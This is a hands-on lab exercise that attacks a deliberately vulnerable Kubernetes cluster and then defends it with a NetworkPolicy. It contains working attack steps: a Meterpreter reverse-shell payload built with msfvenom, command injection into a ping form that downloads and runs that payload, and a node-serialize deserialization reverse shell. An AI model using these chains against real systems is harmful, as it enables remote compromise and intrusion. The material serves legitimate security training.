---
layout: exercise
exercise: 83
title: "Exercise: Kubernetes Network Policies"
tools: openssh-client metasploit-framework curl python3 nmap
directories_to_sync: ssh-config 
---


## Steps

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. Alternatively, use the hot key sequence below:

    ```
    <hold down Alt><hit F2>lxterminal<HIT the enter key>
    ```

2. SSH into the control plane node on the cluster:

    ```shell
    ssh -i /sync/bustakube-node-key root@bustakube-controlplane
    ```

3. Activate the Secrets scenario:

    ```shell
    /usr/share/bustakube/Scenario-Seat-Meister/stage-scenario.sh
    ```

4. Keep this SSH session open for later.

5. Now, before we go further, let's set up Metasploit so we can use it for command and control when we get into this cluster.

6. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

7. Create a directory for creating Meterpreter binaries. Change directory into that new directory.

    ```shell
    mkdir ~/meterpreter
    cd ~/meterpreter
    ```

8. Create a new Meterpreter binary for this exercise:

    ```shell
    msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp \
    -a x86 LHOST=10.23.58.30 LPORT=4445 -o mrsbin -f elf
    ```

9. Create a matching Metasploit console RC script, containing the commands that you'd run to set up the `multi/handler` to await incoming connections from this Meterpreter:

    ```shell
    cat <<END >mrsbin.rc
    use multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST 10.23.58.30
    set LPORT 4445
    set ExitOnSession false
    exploit -j
    END
    ```

10. Start a webserver listening in our `~/meterpreter` directory to allow compromised systems to pull a copy of the `mrsbin` binary:

    ```shell
    python3 -m http.server 80
    ```
11. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

12. Next, start up the Metasploit Framework console, `msfconsole`, passing it the path to the `mrsbin.rc` RC script we just created.

    ```shell
    msfconsole -r ~/meterpreter/mrsbin.rc
    ```

13. Start a new terminal tab by hitting `Ctrl-Shift-t`.

    ```
    Hit Ctrl-Shift-t
    ```

14. Run a TCP port scan of the first node's TCP ports that are reserved for node ports.  

    ```shell
    nmap -Pn -sT -sV -p30000-32767 bustakube-node-1
    ```

15. Review the output - we see there is a web server running on port 31370.

16. Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same "Run" process from step 1.  Then browse to the web application via this URL:

    <http://bustakube-node-1:31370/>

17. Notice that you're seeing a web page telling you about the difficulties a large online concert ticket site is having with availability.

18. Hit `Ctrl-U` to view this web page's source.

    ```
    Hit Ctrl-U
    ```

19. Try out that `ping.php` page that the source code comment is mentioning:

    <http://bustakube-node-1:31370/ping.php>


20. Notice that this form appears to be let you try to ping IP addresses, ostensibly so that Seat Meister staff can check uptime on servers.

21. Try entering `127.0.0.1` into this form.

    ```
    127.0.0.1
    ```

22. That output might look familiar. It's the same output we'd get if we ran the standard `ping` utility commonly found on Linux systems. Let's look for an easy command injection. Try entering `127.0.0.1` into this form again, but add a ` ; id` to that.

    ```
    127.0.0.1 ; id
    ```

23. Notice that this form is clearly vulnerable to an injection attack and is adding our input to a shell command.  In using `id`, we've been told that the web server is running as user `www-data`. We can run arbitrary commands.

24. Let's tell the form to download and run our Meterpreter binary (`mrsbin`).
    
25. In the form field, add a curl command to download the `mrsbin` binary and write it (via `-o /tmp/mrsbin`) to `/tmp/mrsbin`. Then hit the "submit" button.

    ```
    127.0.0.1 ; curl -o /tmp/mrsbin http://10.23.58.30/mrsbin
    ```

26. Now tell the form to make that `mrsbin` binary executable and run it. Put this in the form field and hit the "submit" button.

    ```
    127.0.0.1 ; chmod 755 /tmp/mrsbin ; /tmp/mrsbin
    ```


27. Go check your Metasploit console. You should now see a line that reads something like "Meterpreter session 1 opened…"

28. Interact with this new session:

    ```shell
    sessions -i 1
    ```

29. Instruct Meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a "Process … created" and "Channel … created" line from Metasploit.

    ```shell
    shell
    ```

30. Make the shell more interactive by starting a bash process with the `-i` flag:

    ```shell
    bash -i
    ```

31. List the current directory to look for any other web content.

    ```shell
    ls
    ```

32. It looks like there's a directory here called `oldsite/`. Maybe this hastily-built news site repurposed an existing webserver...  Switch back to your browser.

33. Visit this URL, corresponding to that `oldsite/` directory.

    <http://bustakube-node-1:31370/oldsite/>

34. It looks like Seat Meister used to use this site for bidding out third party software development. There may be some good OSINT here. Let's click on that "Seat Popularity checker service" project that is in the "Bidding Closed" section. Click that title or this link:

    <http://bustakube-node-1:31370/oldsite/seatpopspec.html>

35. It looks like Seat Meister was trying to create some kind of microservice that would indicate how many customers were putting a given seat in their cart. That could explain why their site is so busy. If ticket scalpers have found a way to reach that service, the scalpers could watch for what seats are getting put in carts, then buy those exact seats first! That would drive up ticket prices and keep Seat Meister's servers incredibly busy.

36. The URL in that specification looks like a Kubernetes cluster DNS record, served up by KubeDNS or CoreDNS. It corresponds to a service called `seatpop` in a namespace called `private`. Here is the host component of it:

    ```
    seatpop.private.svc.cluster.local
    ```

37. Let's go back into our Meterpreter session and see if we can reach it. Switch back to your terminal window.

38. From the remote container shell, run a curl command against that URL:

    ```shell
    curl -s http://seatpop.private.svc.cluster.local/
    ```

39. Notice that we seem to have found the microservice described in that specification web site. Here's the output of the last command on our test system:

    ```
    This microservice answers /popularity?seat=, where seat is a Base64-serialized object: city:str, section:str, seat:str
    ```

40. We want to query that microservice. Remember that the specification web page gave us an example object:

    ```
    {"city":"Portland","section":"A","seat":"7-14"}
    ```

41. We need to Base64-encode the object, though.  Take a look at what the Base64-encoded version would look like.  We could look up a Base64-encoder on the web, but there's a simple command line tool for it. Try it out:

    ```shell
    echo '{"city":"Portland","section":"A","seat":"7-14"}' | base64 -w 0
    ```

42. Now that we know how to make a Base64-encoded object, let's try passing it as a GET parameter called `seat` on the `/popularity` API endpoint:

    ```shell
    object=$( echo '{"city":"Portland","section":"A","seat":"7-14"}' |
              base64 -w 0 )
    curl -s http://seatpop.private.svc.cluster.local/popularity?seat=$object
    ```

43. Notice that you were successful - the microservice returned an answer. Here's the output of the last command on our test system:

    ```
    In checkout cart for 5 customers
    ```

44. Now, remember that the specification web page had told us that this seat popularity microservice had to be written in JavaScript, for Node.js? It turns out that a very popular object serialization library for Node.js, called `node-serialize`, has a remote code execution vulnerability that has been present for years and is not being fixed. We can try the exploit to determine if the code is vulnerable.

45. Stop and read about the vulnerability, if you like.

- [Exploiting Node JS deserialization for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

46. We're going to use the same recipe that the author of that post did, creating an exploit that causes the vulnerable Node.js-hosted JavaScript code to connect back to us with a reverse shell. 

47. Before we start building an exploit, we'll need a netcat listener.  Start up a new terminal tab with Ctrl-Shift-t. 

    ```
    Hit Ctrl-Shift-t
    ```

48. Start up a netcat listener on port 9999 on your Kali system, so you have something to catch shells.

    ```shell
    nc -l -p 9999
    ```

49. Start up a new terminal tab with Ctrl-Shift-t. We'll use this to create the exploit.

    ```
    Hit Ctrl-Shift-t
    ```

50. Grab a copy of `nodejsshell.py` from GitHub. It's written for Python 2.7, as opposed to Python 3.

    ```shell
    url="https://raw.githubusercontent.com/ajinabraham"
    curl -LO ${url}/Node.Js-Security-Course/master/nodejsshell.py
    ```

51. Try using `nodejsshell.py` to create an encoded JavaScript reverse shell that will connect back to a netcat listener on TCP port 9999 your Kali system, which has IP address 10.23.58.30:

    ```shell
    python2.7 nodejsshell.py 10.23.58.30 9999
    ```

52. Wait - it looks like the part we need out of this output is just one line, which begins with "eval". Try grabbing just that line and putting it into a variable called `middle`:

    ```shell
    middle=$( python2.7 nodejsshell.py 10.23.58.30 9999 | grep eval )
    ```

53. Now, we need to build a JavaScript object that has that code in a function. Let's construct that string step by step. First, create a variable called `beginning` that has the same preamble block of code that we saw in the exploit writeup.

    ```shell
    beginning='{"rce":"_$$ND_FUNC$$_function (){  '
    ```

54. Next, create a variable called `end` that has the end of the block we saw in the write-up.

    ```shell
    end='}()"}'
    ```

55. Finally, put these three strings together and Base64-encode them:

    ```shell
    echo "${beginning}${middle}$end" | base64 -w 0 ; echo ""
    ```

56. Copy the string from the last command's output. 

57. Switch to the terminal window/tab where you have your Meterpreter session.

58. Now use that exploit as your Base64-encoded seat object - you can use this curl command, but you need to put the string from the previous step at the end of it.

    ```shell
    curl http://seatpop.private.svc.cluster.local/popularity?seat=
    ```

59. Now go back to the window where you have netcat listening on TCP port 9999. Observe that you have a connection. Here's the output on our test system:

    ```
    Connected!
    ```

60. See what pod you've got access in:

    ```shell
    hostname
    ```

61. List the current directory.

    ```shell
    ls -l
    ```

62. Notice that there's a flag directory here. Let's explore it.

    ```shell
    ls flag
    ```

63. Notice that there's a flag directory here. Let's explore it.

    ```shell
    cat flag/FLAG.txt
    ```

64. This flag challenges us to create a network policy that would allow the pods in the `private` namespace to communicate with each other, while not permitting incoming traffic from everywhere else. We can do this!

65. First, let's exit this shell, so we're back to being on our Kali system:

    ```shell
    exit
    ```

66. Next, set up that netcat listener again, so we can retry the attack after we put in this network policy defense.

    ```shell
    nc -l -p 9999
    ```

67. Next, go back to the very first terminal window/tab you used in this exercise, where you had used `ssh` to log in to the control plane node. 

68. Make sure you're still logged into the control plane node:

    ```shell
    hostname
    ```

69. Next, write a YAML manifest for a network policy to the filesystem:

    ```shell
    cat <<END >netpol-allow-traffic-from-same-namespace.yaml
    kind: NetworkPolicy
    apiVersion: networking.k8s.io/v1
    metadata:
      namespace: private
      name: all-pods-allow-from-other-pods-in-this-namespace
    spec:
      podSelector:
        matchLabels:
      ingress:
      - from:
        - podSelector: {}
    END
    ```

70. Now, apply this network policy:

    ```shell
    kubectl apply -f netpol-allow-traffic-from-same-namespace.yaml
    ```

71. Now go to the terminal tab where you had run the curl command that began `curl http://seatpop.private` and re-run the curl command:

    ```
    Run the curl command that fired the exploit - you may want to copy-and-paste
    it from earlier in that terminal session.
    ```

72. Notice that you are now unable to reach the vulnerable microservice. Here's the output on our test system:

    ```
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
    0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    0     0    0     0    0     0      0      0 --:--:--  0:02:09 --:--:--     0
    curl: (28) Failed to connect to seatpop.private.svc.cluster.local port 80: Connection timed out
    ```

73. This exercise is over. Please close all the terminal tabs you opened for it.
